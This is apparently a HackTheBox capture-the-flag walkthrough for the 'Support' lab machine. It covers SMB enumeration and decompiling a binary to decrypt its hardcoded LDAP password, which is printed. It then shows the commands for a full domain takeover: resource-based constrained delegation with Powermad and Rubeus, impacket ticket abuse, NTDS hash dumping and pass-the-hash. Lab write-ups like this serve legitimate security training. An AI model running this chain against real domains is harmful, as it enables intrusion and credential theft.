# HackTheBox - Support

## NMAP

```bash
Nmap scan report for 10.10.11.174
Host is up (0.14s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION 
53/tcp   open  domain? 
| fingerprint-strings:                                                 
|   DNSVersionBindReqTCP: 
|     version                                                          
|_    bind                                                             
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-30 19:01:23Z)   
135/tcp  open  msrpc         Microsoft Windows RPC           
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn    
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped

```

From the nmap scan we can see port 88 is running which means this is a domain controller, we can also see the domain name `support.htb` so lets' add this in `/etc/hosts` file

<img src="https://i.imgur.com/As2uue1.png"/>

## PORT 139/445 (SMB)

Checking for null authenttication on smb, we can see few shares

<img src="https://i.imgur.com/J7mAkZ4.png"/>

Accessing `support-tools` share we can see some tools there like wireshark, putty,sysinternals and etc

<img src="https://i.imgur.com/We2ylPK.png"/>

I tried downloading `SysinternalsSuite.zip` with `get ` but it wasn't working maybe there's a limit to transfer file with larget size but this was around 48 MB, it could be timing as it's taking some to time to transfer the file and the default time out for smbclient is 20 seconds

<img src="https://i.imgur.com/am4fQL6.png"/>

<img src="https://i.imgur.com/t5770tM.png"/>

After increasing timeout, the transfer worked

<img src="https://i.imgur.com/j1seChN.png"/>

But that archive didn't had anything as I was expecting it to have something, moving on to `UserInfo.exe.zip`

<img src="https://i.imgur.com/eeCFBGY.png"/>

This has dll and exe which we can try to analyze with either `ILspy` or `dnspy` and for that let's move to windows machine

On opening `UserInfo.exe` with ILspy we can find the username `support` in `LdapQuery` function also we can see another function being called `getPassword` which returns the password, we can also get the username which is `ldap`

<img src="https://i.imgur.com/W1XDOlT.png"/>


Checking the getPassword function we can see how it's returning the plain text password for support user by using the value from `enc_password` and the `key`

<img src="https://i.imgur.com/0DfQ7hR.png"/>


<img src="https://i.imgur.com/TNVnuCB.png"/>

We can get the plain text password by simply printing the string returned from the function 

```c#
using System;
using System.Text;
namespace uwu {
	class Program {
		static void Main(string[] args) {
			string enc_password="0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
			byte[] key = Encoding.ASCII.GetBytes("armando");
			byte[] array = Convert.FromBase64String(enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
			}
			Console.WriteLine(Encoding.Default.GetString(array2));
		}
	}
}
```

<img src="https://i.imgur.com/rV2r3l5.png"/>

The credentials can also be retrieved by running `userinfo.exe` and sniffing the packets with wireshark on the interface

<img src="https://i.imgur.com/U0Bpp1e.png"/>

<img src="https://i.imgur.com/HbxWFmC.png"/>

## Foothold

Having the credentials we can try to dump usernames from `windapsearch`

```bash
windapsearch -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --dc 10.10.11.174
 --module users
```

<img src="https://i.imgur.com/ZIbwMy9.png"/>

The usernames can be sorted with `awk`

```bash
windapsearch -d support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --dc 10.10.11.174 --module users | grep "sAMAccountName" | awk -F ': ' '{print $2}' > user_names.txt
```

<img src="https://i.imgur.com/vCDkO2O.png"/>

Having the usernames, we can try password spary with `kerbrute` 


<img src="https://i.imgur.com/sNzroAP.png"/>

Using windapsearach with `--full` option we can list every attribute set on user objects which will show the password for support user

<img src="https://i.imgur.com/oT5d2Dn.png"/>

The credentials can be verified with cme on winrm

<img src="https://i.imgur.com/QBtrMtR.png"/>

This shows `Pwn3d!` which means that we can use the credentials on winrm to get a shell

<img src="https://i.imgur.com/23YqMw3.png"/>

Having a shell I ran `PowerUp` script which didn't showed any thing

<img src="https://i.imgur.com/X2okU7Y.png"/>

Next I tried using `Sharphound` to gather domain data

<img src="https://i.imgur.com/xIhSr31.png"/>

<img src="https://i.imgur.com/6nMP9aJ.png"/>

# Privilege Escalation
Uploading json files to bloodhound, `Shared Support Account` group which support is a member of has `Generical All` on the domain controller

<img src="https://i.imgur.com/3ggXLBv.png"/>

This means we have can have complete control over the domain controller by first adding a new computer account with `Powermad` and abusing write privilege on `dc.support.htb` to add `msDS-AllowedToActOnBehalfOfOtherIdentity` which will allow our new machine account to impersonate as any user from the domain to access the domain controller

```bash
New-MachineAccount -MachineAccount UwU -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Ver
bose
```

<img src="https://i.imgur.com/5AG76q2.png"/>

Using `Active Directory Module` we can set `msDS-AllowedToActOnBehalfOfOtherIdentity` 

```bash
Set-ADComputer dc -PrincipalsAllowedToDelegateToAccount UwU$
Get-ADComputer dc -Properties PrincipalsAllowedToDelegateToAccount
```

<img src="https://i.imgur.com/dTUEiHK.png"/>

Now to get a S4U hash to impersonate as administrator with `Rubeus`

<img src="https://i.imgur.com/MKV5nyL.png"/>

```
Rubeus.exe s4u /user:UwU$ /password:123456 /domain:support.htb /impersonateuser:administrator /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /msdsspn:host/dc.support.htb /ptt
```

<img src="https://i.imgur.com/3WjzBz8.png"/>

Even tho we have injected the impersonated ticket for administrator with `/ptt` pass the ticket still we won't be able to access `c$` share or launch cmd with psexec as we need local administrator to do that

<img src="https://i.imgur.com/I0AJ8TI.png"/>

So instead we can copy the the ticket from rubeus which gets generated in `.kirbi` format which we can conver into `.ccache` and use it with impacket

```
Rubeus.exe s4u /user:UwU$ /password:123456 /domain:support.htb /impersonateuser:administrator /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /msdsspn:host/dc.support.htb /nowrap
```

<img src="https://i.imgur.com/CT5hMkI.png"/>

Copy the hash, base64 decode it and covert it with `ticketConverter.py`

<img src="https://i.imgur.com/GsplavY.png"/>

<img src="https://i.imgur.com/sKKq9Q0.png"/>

<img src="https://i.imgur.com/5sGRymK.png"/>


<img src="https://i.imgur.com/nSUkuPN.png"/>

Or we can request a service ticket with impacket's `getST`  and use either `psexec` , `wmiexec` or `smbexec` to get a shell

```bash
getST.py -spn cifs/dc.support.htb support.htb/UwU\$ -impersonate administrator
```

<img src="https://i.imgur.com/Z98vw7A.png"/>

<img src="https://i.imgur.com/YsctOpL.png"/>

<img src="https://i.imgur.com/GU4bdwZ.png"/>

Running `secretsdump.py` to dump NTDS.dit which contains domain user's hashes

<img src="https://i.imgur.com/6bB8YSy.png"/>

With the administrator's hash we can also perform `pass the hash`

<img src="https://i.imgur.com/d9PCh47.png"/>

## References
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
- https://pentestlab.blog/2021/10/18/resource-based-constrained-delegation/

